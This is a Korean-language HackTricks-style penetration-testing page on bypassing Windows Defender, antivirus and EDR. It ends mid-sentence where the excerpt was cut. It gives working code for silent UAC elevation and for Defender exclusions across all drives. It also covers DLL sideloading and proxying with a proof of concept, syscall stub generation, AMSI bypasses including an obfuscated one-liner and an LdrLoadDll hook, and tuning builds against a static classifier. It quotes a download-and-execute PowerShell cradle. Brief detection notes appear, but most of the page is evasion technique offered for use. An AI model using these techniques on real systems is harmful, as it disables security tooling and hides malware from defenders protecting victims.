# Antivirus (AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에** [**@m2rc_p**](https://twitter.com/m2rc_p)**가 작성했습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 중지하는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV인 것처럼 가장해 Windows Defender가 작동하지 않도록 중지하는 도구.
- [관리자 권한으로 Defender 비활성화](basic-powershell-for-pentesters/README.md)

### Defender를 변조하기 전 설치 프로그램 스타일의 UAC 유도

게임 치트로 가장한 공개 로더는 서명되지 않은 Node.js/Nexe 설치 프로그램 형태로 배포되는 경우가 많으며, 먼저 **사용자에게 권한 상승을 요청**한 다음 Defender를 무력화합니다. 흐름은 간단합니다.

1. `net session`으로 관리자 컨텍스트인지 확인합니다. 이 명령은 호출자에게 관리자 권한이 있을 때만 성공하므로, 실패하면 로더가 표준 사용자로 실행 중이라는 뜻입니다.
2. `RunAs` 동사를 사용해 즉시 자신을 다시 실행하여 원래 명령줄을 유지하면서 예상되는 UAC 동의 프롬프트를 표시합니다.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

피해자는 이미 “cracked” 소프트웨어를 설치한다고 믿고 있으므로, 일반적으로 이 프롬프트를 수락해 malware에 Defender의 정책을 변경하는 데 필요한 권한을 부여합니다.<sup>[[26]](#references)</sup>

### 모든 드라이브 문자에 대한 포괄적인 `MpPreference` 제외 항목

권한 상승 후 GachiLoader 스타일의 체인은 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 최대한 넓힙니다. loader는 먼저 GUI watchdog을 종료한 다음 (`taskkill /F /IM SecHealthUI.exe`), **매우 광범위한 제외 항목**을 적용해 모든 사용자 프로필, 시스템 디렉터리, 이동식 디스크를 검사할 수 없게 만듭니다:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

주요 관찰 사항:

- 루프는 마운트된 모든 파일 시스템(D:\, E:\, USB 스틱 등)을 순회하므로 **앞으로 디스크 어디에 저장되든 페이로드가 무시됩니다**.
- `.sys` 확장자 제외는 향후를 고려한 조치입니다. 공격자는 나중에 Defender를 다시 건드리지 않고도 서명되지 않은 드라이버를 로드할 수 있는 선택지를 남겨둡니다.
- 모든 변경 사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 적용되므로, 이후 단계에서 UAC를 다시 트리거하지 않고도 제외 항목이 유지되는지 확인하거나 확장할 수 있습니다.

Defender 서비스는 중지되지 않으므로 단순한 상태 확인에서는 “백신 활성화”라고 계속 보고하지만, 실제로는 실시간 검사가 해당 경로를 검사하지 않습니다.<sup>[[26]](#references)</sup>

## **AV Evasion 방법론**

현재 AV는 파일이 악성인지 확인하기 위해 정적 탐지, 동적 분석을 비롯한 다양한 방법을 사용하며, 고급 EDR의 경우 동작 분석도 사용합니다.

### **정적 탐지**

정적 탐지는 바이너리나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 표시하고, 파일 자체의 정보(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등)를 추출하여 수행됩니다. 따라서 알려진 공개 도구를 사용하면 쉽게 탐지될 수 있습니다. 해당 도구는 이미 분석되어 악성으로 표시되었을 가능성이 있기 때문입니다. 이런 종류의 탐지를 우회하는 몇 가지 방법은 다음과 같습니다.

- **암호화**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없지만, 메모리에서 프로그램을 복호화하고 실행할 일종의 loader가 필요합니다.

- **난독화**

때로는 바이너리나 스크립트의 문자열 몇 개만 변경해도 AV를 통과할 수 있지만, 난독화하려는 대상에 따라 시간이 많이 들 수 있습니다.

- **커스텀 도구**

직접 도구를 개발하면 알려진 악성 시그니처가 없지만, 시간과 노력이 많이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지를 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 파일을 여러 세그먼트로 나눈 다음 Defender에 각 세그먼트를 개별적으로 검사하도록 합니다. 이를 통해 바이너리에서 어떤 문자열이나 바이트가 표시되었는지 정확히 알 수 있습니다.

실용적인 AV Evasion을 다루는 이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)도 꼭 확인해 보시기 바랍니다.

### 정적 분류기를 위한 오프라인 PE 기능 테스트

패킹되거나 암호화된 페이로드 바이트는 정적 분류기에 입력되는 요소 중 하나일 뿐입니다. EMBER2024는 import, export, 섹션, 헤더, Authenticode 데이터를 포함한 PE 기능을 추출합니다.<sup>[[48]](#references)</sup> 한 loader 실험에서 무해해 보이는 import 141개를 추가하자 EMBER2024의 악성 점수가 93% 낮아졌고, malware와 관련된 import는 점수를 높였습니다. 이는 해당 모델과 샘플에서 나온 결과이며, 특정 AV/EDR 제품을 안정적으로 우회하는 방법은 아닙니다.<sup>[[50]](#references)</sup>

승인된 loader 테스트에서는 페이로드와 실행 경로를 동일하게 유지하고, 각 변형에서 의도한 빌드 변수 하나만 변경한 뒤 오프라인으로 점수를 비교합니다. 빌드 변경은 여러 기능 그룹에 영향을 줄 수 있으므로 결과 PE 기능을 확인합니다.<sup>[[49]](#references)[[50]](#references)</sup> 의도한 import를 IAT에 유지하려면 선택한 Win32 API를 도달 가능한 코드에서 호출합니다. 고정된 위장 함수를 만들어 시그니처가 될 위험을 감수하기보다는, 빌드마다 선택 항목을 바꾸고 호출 지점을 분산합니다. 이 실험에서는 유효한 코드 서명, export 항목, `.pdata`를 확장하는 더 많은 함수도 점수를 낮춘 것으로 보고되었습니다. 유효하지 않은 서명은 영향이 거의 없었고, `.pdata`의 영향은 작았습니다.<sup>[[50]](#references)</sup>

`thrember` 패키지는 기능 추출과 벤치마크 모델을 제공합니다. 설치 후 기존 `models` 디렉터리를 지정해 `thrember.download_models("models")`를 실행한 다음, 상위 디렉터리에서 점수 산출기를 실행합니다. 다운로드 helper가 현재 작업 디렉터리를 변경하기 때문입니다. PE 분류기는 빌드를 스캔 서비스에 제출하지 않고도 디렉터리 단위로 점수를 산출할 수 있습니다.<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep 비교 중에는 model 및 feature-extractor 버전을 고정하세요. 오프라인 점수가 낮아졌다는 것은 이 classifier가 변경된 binary에 어떻게 반응하는지만 보여줄 뿐, behavioral analysis, emulation 또는 vendor의 다른 model을 회피했다는 증거는 아닙니다.<sup>[[49]](#references)[[50]](#references)</sup> [가상화된 payload에서 per-build polymorphism과 외부 binary camouflage를 적용하는 방법](virtualized-payload-execution.md#camouflaging-the-outer-go-executable)은 별도의 execution model을 참조하세요.

### **동적 분석**

동적 분석은 AV가 sandbox에서 binary를 실행하고 악성 활동(예: 브라우저 암호를 복호화해 읽으려 하거나 LSASS에서 minidump를 수행하는 등)을 감시하는 방식입니다. 이 부분은 다루기가 조금 까다로울 수 있지만, sandbox를 회피하기 위해 할 수 있는 몇 가지 방법을 소개합니다.

- **실행 전 Sleep** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업을 방해하지 않도록 파일을 검사할 시간이 매우 짧으므로, 오래 Sleep하면 binary 분석을 방해할 수 있습니다. 다만 구현 방식에 따라 많은 AV sandbox가 Sleep을 건너뛸 수 있다는 문제가 있습니다.
- **시스템 리소스 확인** 일반적으로 sandbox는 사용할 수 있는 리소스가 매우 적습니다(예: RAM < 2GB). 그렇지 않으면 사용자의 시스템 속도를 늦출 수 있기 때문입니다. 여기서 더 창의적인 방법을 사용할 수도 있습니다. 예를 들어 CPU 온도나 팬 속도를 확인하는 방법이 있습니다. 모든 항목이 sandbox에 구현되어 있는 것은 아닙니다.
- **시스템별 확인** "contoso.local" 도메인에 가입된 사용자의 workstation을 대상으로 하려는 경우, 컴퓨터의 도메인을 확인해 지정한 도메인과 일치하는지 검사할 수 있습니다. 일치하지 않으면 프로그램을 종료하면 됩니다.

Microsoft Defender Sandbox의 컴퓨터 이름은 HAL9TH인 것으로 알려져 있습니다. 따라서 malware가 실행되기 전에 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender sandbox 내부에 있다는 뜻이므로 프로그램을 종료하면 됩니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)가 공유한 sandbox 대응에 관한 다른 유용한 팁입니다.

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 글에서 앞서 말했듯이, **공개 도구**는 결국 **탐지됩니다**. 그러니 스스로에게 다음과 같은 질문을 해보세요.

예를 들어 LSASS를 dump하려면 **정말 mimikatz를 사용해야 할까요**? 아니면 덜 알려져 있으면서 LSASS도 dump하는 다른 프로젝트를 사용할 수 있을까요?

아마도 후자가 정답일 것입니다. mimikatz를 예로 들면, AV와 EDR이 가장 많이 탐지하는 malware 중 하나일 것입니다. 프로젝트 자체는 매우 훌륭하지만 AV를 우회하면서 사용하기는 상당히 까다롭습니다. 따라서 원하는 작업을 수행할 대안을 찾아보세요.

> [!TIP]
> 회피를 위해 payload를 수정할 때는 Defender에서 **자동 샘플 제출을 끄세요**. 그리고 장기적으로 회피를 달성하는 것이 목표라면 **절대로 VIRUSTOTAL에 업로드하지 마세요**. 특정 AV가 payload를 탐지하는지 확인하려면 VM에 해당 AV를 설치하고, 자동 샘플 제출을 끌 수 있는지 확인한 다음, 결과에 만족할 때까지 그곳에서 테스트하세요.

## EXEs vs DLLs

가능하면 회피를 위해 항상 **DLL 사용을 우선하세요**. 제 경험상 DLL 파일은 대체로 **탐지 및 분석될 가능성이 훨씬 낮습니다**. 따라서 payload를 DLL로 실행할 방법이 있다면 일부 상황에서 탐지를 피하는 데 사용할 수 있는 매우 간단한 방법입니다.

이 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 4/26의 탐지율을 보이는 반면 EXE payload의 탐지율은 7/26입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE payload와 일반 Havoc DLL 비교</p></figcaption></figure>

이제 DLL 파일을 사용해 훨씬 더 은밀하게 동작하도록 하는 몇 가지 방법을 소개하겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 victim application과 malicious payload를 나란히 배치해 loader가 사용하는 DLL 검색 순서를 이용합니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 PowerShell script를 사용하면 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

이 명령은 "C:\Program Files\\" 내에서 DLL hijacking에 취약한 프로그램과 해당 프로그램이 로드하려는 DLL 파일 목록을 출력합니다.

**DLL Hijackable/Sideloadable 프로그램을 직접 살펴보는 것을** 강력히 권장합니다. 이 technique은 제대로 수행하면 꽤 은밀하지만, 공개적으로 알려진 DLL Sideloadable 프로그램을 사용하면 쉽게 발각될 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름으로 악성 DLL을 배치하는 것만으로는 payload가 로드되지 않습니다. 프로그램은 해당 DLL에 특정 함수가 있을 것으로 예상하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 다른 technique을 사용하겠습니다.

**DLL Proxying**은 프로그램이 proxy(악성) DLL에 보내는 호출을 원래 DLL로 전달합니다. 이를 통해 프로그램의 기능을 유지하면서 payload 실행도 처리할 수 있습니다.

[@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용하겠습니다.

다음은 제가 따른 단계입니다:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

마지막 명령을 실행하면 DLL 소스 코드 템플릿과 이름이 변경된 원본 DLL, 이렇게 두 개의 파일이 생성됩니다.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

다음은 결과입니다:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)으로 인코딩한 shellcode와 proxy DLL 모두 [antiscan.me](https://antiscan.me)에서 탐지율이 0/26입니다! 성공이라고 할 만하네요.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading에 관한 [S3cur3Th1sSh1t의 twitch VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 영상](https://www.youtube.com/watch?v=3eROsG_WNpE)을 시청해, 여기서 논의한 내용을 더 깊이 있게 알아보시길 **강력히 추천합니다**.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE 모듈은 실제로는 "forwarder"인 함수를 export할 수 있습니다. 코드가 있는 위치를 가리키는 대신, export 항목에 `TargetDll.TargetFunc` 형식의 ASCII 문자열이 들어 있습니다. 호출자가 export를 확인하면 Windows loader는 다음 작업을 수행합니다.

- `TargetDll`이 아직 로드되지 않았다면 로드
- 해당 DLL에서 `TargetFunc` 확인

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL인 경우, 보호된 KnownDLLs namespace에서 가져옵니다(예: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll`이 KnownDLL이 아닌 경우, forward resolution을 수행하는 모듈의 디렉터리도 포함하는 일반 DLL search order가 사용됩니다.

이를 통해 간접 sideloading 원시 기능을 활용할 수 있습니다. 즉, KnownDLL이 아닌 모듈 이름으로 forward되는 함수를 export하는 서명된 DLL을 찾은 다음, 그 서명된 DLL과 공격자가 제어하는 DLL을 동일한 디렉터리에 두고, 후자의 이름을 forward된 대상 모듈과 정확히 일치시킵니다. forward된 export가 호출되면 loader는 forward를 확인하고 같은 디렉터리에서 공격자의 DLL을 로드해 DllMain을 실행합니다.<sup>[[13]](#references)</sup>

Windows 11에서 관찰된 예:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서에 따라 확인됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더에 복사합니다.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 악성 NCRYPTPROV.dll을 같은 폴더에 배치합니다. 최소한의 DllMain만으로도 코드 실행이 가능하며, DllMain을 트리거하기 위해 forwarded function을 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거합니다:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

관찰된 동작:
- rundll32 (서명됨)가 side-by-side `keyiso.dll` (서명됨)을 로드함
- `KeyIsoSetAuditingInterface`를 확인하는 동안 로더가 포워드된 `NCRYPTPROV.SetAuditingInterface`를 따라감
- 그런 다음 로더가 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 해당 DLL의 `DllMain`을 실행함
- `SetAuditingInterface`가 구현되지 않은 경우, `DllMain`이 이미 실행된 후에야 "missing API" 오류가 발생함

탐색 팁:
- 대상 모듈이 KnownDLL이 아닌 포워드된 export에 집중하세요. KnownDLL은 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 아래에 나열되어 있습니다.
- 다음과 같은 도구를 사용하여 포워드된 export를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder inventory를 확인하세요: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

탐지/방어 아이디어:
- LOLBins(예: rundll32.exe)이 시스템 경로가 아닌 위치에서 서명된 DLL을 로드한 뒤, 같은 디렉터리에서 같은 기본 이름을 가진 non-KnownDLLs를 로드하는지 모니터링
- 다음과 같은 프로세스/모듈 체인에 경고 설정: `rundll32.exe` → 시스템 경로가 아닌 `keyiso.dll` → 사용자 쓰기 가능 경로의 `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 쓰기+실행을 차단

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 일시 중단된 프로세스, direct syscalls, 대체 실행 방식을 사용해 EDR을 우회하는 payload toolkit입니다`

Freeze를 사용하면 은밀한 방식으로 shellcode를 로드하고 실행할 수 있습니다.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 고양이와 쥐의 게임일 뿐입니다. 오늘 작동하는 방법이 내일은 탐지될 수 있으므로, 하나의 도구에만 의존하지 말고 가능하다면 여러 Evasion 기법을 연계해 사용하세요.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR은 `ntdll.dll`의 syscall stub에 **user-mode inline hook**을 거는 경우가 많습니다. 이러한 hook을 우회하려면 올바른 **SSN**(System Service Number)을 로드하고, hook이 걸린 export entrypoint를 실행하지 않은 채 커널 모드로 전환하는 **direct** 또는 **indirect** syscall stub을 생성할 수 있습니다.<sup>[[32]](#references)</sup>

**호출 옵션:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` 명령을 넣습니다(`ntdll` export를 거치지 않음).
- **Indirect**: `ntdll` 내부의 기존 `syscall` gadget으로 점프해 커널 전환이 `ntdll`에서 시작된 것처럼 보이게 합니다(heuristic 기반 Evasion에 유용). **randomized indirect**는 호출마다 pool에서 gadget을 선택합니다.
- **Egg-hunt**: 디스크에 정적인 `0F 05` opcode 시퀀스를 넣지 않고, 런타임에 syscall 시퀀스를 찾습니다.

**Hook에 강한 SSN 확인 전략:**
- **FreshyCalls (VA sort)**: stub 바이트를 읽는 대신 syscall stub을 virtual address 기준으로 정렬해 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 매핑하고, 해당 파일의 `.text`에서 SSN을 읽은 뒤 매핑을 해제합니다(메모리 내 모든 hook 우회).
- **RecycledGate**: VA 정렬 기반 SSN 추론과 stub이 깨끗할 때의 opcode 검증을 결합합니다. hook이 감지되면 VA 추론으로 대체합니다.
- **HW Breakpoint**: `syscall` 명령에 DR0을 설정하고 VEH를 사용해 런타임에 `EAX`에서 SSN을 가져옵니다. hook이 걸린 바이트를 파싱하지 않습니다.

SysWhispers4 사용 예시:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에는 AV가 **디스크에 있는 파일**만 검사할 수 있었기 때문에, 페이로드를 **메모리에서 직접** 실행할 수만 있다면 AV는 이를 방지할 만큼 충분한 가시성을 확보하지 못해 아무것도 할 수 없었습니다.

AMSI 기능은 다음 Windows 구성 요소에 통합되어 있습니다.

- 사용자 계정 컨트롤(UAC)(EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell(스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host(wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

AMSI를 사용하면 스크립트 내용을 암호화되거나 난독화되지 않은 형태로 노출하여 바이러스 백신 솔루션이 스크립트 동작을 검사할 수 있습니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`을 실행하면 Windows Defender에서 다음 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙인 다음 스크립트를 실행한 실행 파일의 경로를 표시하는 것을 확인할 수 있습니다. 이 경우에는 powershell.exe입니다.

디스크에 파일을 하나도 저장하지 않았지만, AMSI 때문에 메모리에서 실행했는데도 탐지되었습니다.

또한 **.NET 4.8**부터는 C# 코드도 AMSI를 통해 검사됩니다. 메모리에서 실행하기 위해 `Assembly.Load(byte[])`을 사용하는 경우에도 영향을 받습니다. 따라서 AMSI를 회피하려고 메모리에서 실행한다면 더 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지 있습니다.

- **Obfuscation**

AMSI는 주로 정적 탐지를 사용하므로, 로드하려는 스크립트를 수정하면 탐지를 회피하는 데 도움이 될 수 있습니다.

하지만 AMSI는 여러 계층으로 난독화된 스크립트도 난독화를 해제할 수 있으므로, 난독화 방식에 따라서는 좋지 않은 선택일 수 있습니다. 따라서 탐지를 회피하는 방법이 그리 단순하지만은 않습니다. 다만 때로는 변수 이름 몇 개만 바꿔도 충분할 수 있으므로, 해당 항목이 얼마나 많이 탐지 대상으로 표시되었는지에 따라 다릅니다.

- **AMSI Bypass**

AMSI는 DLL을 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 로드하는 방식으로 구현되어 있으므로, 권한이 없는 사용자로 실행 중이더라도 쉽게 변조할 수 있습니다. AMSI 구현상의 이러한 결함으로 인해 연구자들은 AMSI 검사를 회피하는 여러 방법을 찾아냈습니다.

**오류 강제 발생**

AMSI 초기화를 강제로 실패시키면(amsiInitFailed) 현재 프로세스에서 검사가 시작되지 않습니다. 이 방법은 처음에 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며, Microsoft는 더 광범위하게 사용되는 것을 막기 위한 시그니처를 개발했습니다.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

PowerShell 코드 한 줄만으로 현재 PowerShell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었습니다. 물론 이 코드는 AMSI 자체에 의해 탐지되므로, 이 기법을 사용하려면 약간의 수정이 필요합니다.

다음은 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

이 게시물이 공개되면 아마 탐지될 수 있다는 점을 염두에 두세요. 따라서 탐지되지 않는 것이 목표라면 코드를 공개하지 않는 것이 좋습니다.

**Memory Patching**

이 기법은 [@RastaMouse](https://twitter.com/_RastaMouse/)가 처음 발견했습니다. 사용자 제공 입력을 검사하는 `amsi.dll`의 "AmsiScanBuffer" 함수 주소를 찾아, E_INVALIDARG 코드를 반환하는 명령어로 덮어씁니다. 이렇게 하면 실제 검사 결과가 0을 반환하고, 이를 깨끗한 결과로 해석합니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)을 참고하세요.

powershell에서 AMSI를 우회하는 다른 기법도 많이 있습니다. 자세한 내용은 [**이 페이지**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**이 저장소**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하세요.

### amsi.dll 로드를 막아 AMSI 차단하기 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 프로세스에 로드된 후에만 초기화됩니다. 안정적이고 언어에 구애받지 않는 우회 방법은 `ntdll!LdrLoadDll`에 user-mode hook을 설정해 요청된 모듈이 `amsi.dll`일 때 오류를 반환하는 것입니다. 그러면 AMSI가 로드되지 않아 해당 프로세스에서는 검사가 수행되지 않습니다.<sup>[[23]](#references)</sup>

구현 개요 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
메모
- PowerShell, WScript/CScript 및 사용자 지정 loader 등 AMSI를 로드하는 모든 환경에서 작동합니다.
- 긴 명령줄 흔적을 피하려면 스크립트를 stdin으로 전달하는 방식(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- `DllRegisterServer`를 호출하는 `regsvr32` 등 LOLBins를 통해 실행되는 loader에서 사용된 사례가 있습니다.

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 도 AMSI를 우회하는 스크립트를 생성합니다.
**[https://amsibypass.com/](https://amsibypass.com/)** 도 무작위 사용자 정의 함수, 변수, 문자 표현식을 사용하고 PowerShell 키워드의 대소문자를 무작위로 적용해 signature를 피하는 AMSI 우회 스크립트를 생성합니다.

**탐지된 signature 제거**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용해 현재 프로세스 메모리에서 탐지된 AMSI signature를 제거할 수 있습니다. 이 도구는 현재 프로세스의 메모리에서 AMSI signature를 검색한 다음 NOP 명령어로 덮어써 메모리에서 제거합니다.

**AMSI를 사용하는 AV/EDR 제품**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**Powershell version 2 사용**
PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI 검사 없이 스크립트를 실행할 수 있습니다. 다음과 같이 할 수 있습니다:

```bash
powershell.exe -version 2
```

## PS 로깅

PowerShell 로깅은 시스템에서 실행된 모든 PowerShell 명령을 기록하는 기능입니다. 감사 및 문제 해결에 유용하지만, **탐지를 피하려는 공격자에게는 문제가 될 수 있습니다**.

PowerShell 로깅을 우회하려면 다음 기법을 사용할 수 있습니다.

